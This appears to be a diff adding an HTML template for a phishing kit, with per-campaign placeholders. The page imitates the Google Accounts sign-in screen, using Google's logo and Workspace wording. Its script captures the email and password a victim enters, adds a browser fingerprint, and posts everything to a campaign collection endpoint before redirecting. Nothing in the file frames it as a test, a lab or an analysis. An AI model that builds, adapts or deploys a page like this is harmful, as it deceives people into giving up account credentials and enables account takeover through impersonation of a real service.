@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in - Google Accounts</title>
+  <script src="/fingerprint.js"></script>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { font-family:'Google Sans',Roboto,Arial,sans-serif; background:#fff; display:flex; align-items:center; justify-content:center; min-height:100vh; }
+    .card { background:#fff; padding:3rem 2.5rem 2rem; border-radius:28px; border:1px solid #dadce0; width:100%; max-width:450px; text-align:center; }
+    .logo { width:75px; height:75px; margin:0 auto 1rem; background:url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><path fill="%23FFC107" d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 12.955 4 4 12.955 4 24s8.955 20 20 20 20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z"/><path fill="%23FF3D00" d="m6.306 14.691 6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 16.318 4 9.656 8.337 6.306 14.691z"/><path fill="%234CAF50" d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238A11.91 11.91 0 0 1 24 36c-5.202 0-9.619-3.317-11.283-7.946l-6.522 5.025C9.505 39.556 16.227 44 24 44z"/><path fill="%231976D2" d="M43.611 20.083H42V20H24v8h11.303a12.04 12.04 0 0 1-4.087 5.571l.003-.002 6.19 5.238C36.971 39.205 44 34 44 24c0-1.341-.138-2.65-.389-3.917z"/></svg>') no-repeat center; background-size:contain; }
+    h1 { font-size:1.5rem; font-weight:400; color:#202124; margin-bottom:0.3rem; }
+    h2 { font-size:1rem; font-weight:400; color:#5f6368; margin-bottom:1.5rem; }
+    .input-wrap { position:relative; margin-bottom:1rem; text-align:left; }
+    .input-wrap input { width:100%; padding:0.85rem 0.75rem; border:1px solid #dadce0; border-radius:4px; font-size:1rem; background:#fff; }
+    .input-wrap input:focus { outline:none; border-color:#1a73e8; box-shadow:0 0 0 2px rgba(26,115,232,0.15); }
+    .input-wrap label { position:absolute; left:0.75rem; top:0.85rem; color:#5f6368; font-size:1rem; transition:0.15s; pointer-events:none; background:#fff; padding:0 4px; }
+    .input-wrap input:focus + label, .input-wrap input:not(:placeholder-shown) + label { top:-0.55rem; font-size:0.75rem; color:#1a73e8; }
+    .info-text { text-align:left; font-size:0.8rem; color:#5f6368; margin-bottom:1.5rem; margin-top:-0.5rem; }
+    .actions { display:flex; justify-content:space-between; align-items:center; margin-top:1.5rem; }
+    .actions a { color:#1a73e8; font-size:0.85rem; text-decoration:none; font-weight:500; }
+    .actions a:hover { background:#f6fafe; }
+    button { background:#1a73e8; color:#fff; border:none; padding:0.6rem 1.5rem; border-radius:4px; font-size:0.9rem; cursor:pointer; font-weight:500; }
+    button:hover { background:#1765cc; }
+    .error { color:#d93025; font-size:0.8rem; text-align:left; margin-bottom:0.5rem; display:none; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo"></div>
+    <h1>Sign in</h1>
+    <h2>to continue to Google Workspace</h2>
+    <div class="error" id="error">Couldn't sign you in. Check your email and password.</div>
+    <form id="loginForm">
+      <div class="input-wrap">
+        <input type="email" id="email" placeholder=" " autocomplete="off">
+        <label>Email or phone</label>
+      </div>
+      <div class="input-wrap">
+        <input type="password" id="password" placeholder=" ">
+        <label>Password</label>
+      </div>
+      <div class="info-text">Not your device? Use Guest mode to sign in privately.</div>
+      <div class="actions">
+        <a href="#">Forgot email?</a>
+        <button type="submit">Next</button>
+      </div>
+    </form>
+  </div>
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const fp = await getFingerprint();
+      try {
+        const res = await fetch('/c/<%= campaign.id %>', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email, password, ...fp, fingerprints: JSON.stringify(fp) })
+        });
+        const data = await res.json();
+        if (data.redirect) window.location.href = data.redirect;
+      } catch { window.location.href = '<%= redirect %>'; }
+    });
+  </script>
+</body>
+</html>
